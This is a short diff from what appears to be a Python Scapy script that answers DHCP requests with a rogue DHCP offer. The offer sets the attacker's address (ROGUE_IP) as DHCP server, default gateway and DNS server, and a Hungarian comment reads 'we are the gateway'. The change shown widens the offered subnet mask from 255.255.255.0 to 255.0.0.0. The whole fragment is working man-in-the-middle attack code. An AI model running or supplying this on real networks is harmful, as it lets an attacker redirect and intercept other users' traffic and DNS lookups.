@@ -23,7 +23,7 @@ def handle_discover(pkt):
                 BOOTP(op=2, yiaddr=offer_ip, siaddr=ROGUE_IP,
                       chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
                 DHCP(options=[("message-type", 2), ("server_id", ROGUE_IP),
-                              ("subnet_mask", "255.255.255.0"),
+                              ("subnet_mask", "255.0.0.0"),
                               ("router", ROGUE_IP),          # <-- mi vagyunk a GW
                               ("name_server", ROGUE_IP),
                               ("lease_time", 3600), "end"]))
